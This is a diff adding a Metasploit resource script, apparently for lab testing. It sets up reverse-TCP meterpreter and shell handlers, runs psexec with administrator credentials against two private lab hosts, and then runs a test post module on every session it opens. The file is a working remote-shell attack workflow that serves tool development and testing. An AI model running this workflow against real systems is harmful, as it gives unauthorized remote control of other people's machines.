@@ -1,0 +1,50 @@
+# rc script to start a rev meterp handler and set autorun my test module
+
+load lab
+lab_load test_lab.yml
+lab_start all
+
+<ruby>
+	# Let's require in our "awesome" resource helping file
+	resource_dir = File.join(Msf::Config.install_root, "scripts", "resource")
+	require File.join(resource_dir, "helpers","demo_methods")
+	test_mods_dir = File.join(Msf::Config.install_root, "test", "modules")
+	run_single("loadpath \"#{test_mods_dir}\"")
+
+	# let's set some stuff up using those new methods
+	# assign lhost to be whatever IP I have on arg network, which is my host only network
+	rc_auto_lhost("192.168.170.1/24")
+	# setup a handler on 8888
+	rc_auto_handler("8888") # meterpreter/reverse_tcp handler by default
+	# setup a shell handler too
+	rc_auto_handler("8887", "windows/shell/reverse_tcp")
+</ruby>
+
+# run psexec to setup our meterp session, could use db_fun here, or a binary or an exploit etc
+use windows/smb/psexec
+set PAYLOAD windows/meterpreter/reverse_tcp
+set DisablePayloadHandler true
+set ExitOnSession false
+set RHOST 192.168.170.128
+set LPORT 8888
+set SMBUser administrator
+set SMBPass	lab
+exploit -z
+# now the shell payload
+set RHOST 192.168.170.129
+set PAYLOAD windows/shell/reverse_tcp
+set LPORT 8887
+exploit -z
+
+# could also have used an array for the ips, or discover them dynamically and use db_fun
+# to create a db set and then running db_set_run_module on them etc
+
+use post/test/services
+# set any options here, this test mod uses sane defaults, so not necessary
+
+# wait to make sure sessions are established, but user can hit enter to short circuit the pause
+# alternatively we could register for on_session_creation call backs and then run, too fancy 4now
+<ruby>
+	rc_pause(8,true)
+	rc_run_on_all_sessions
+</ruby>
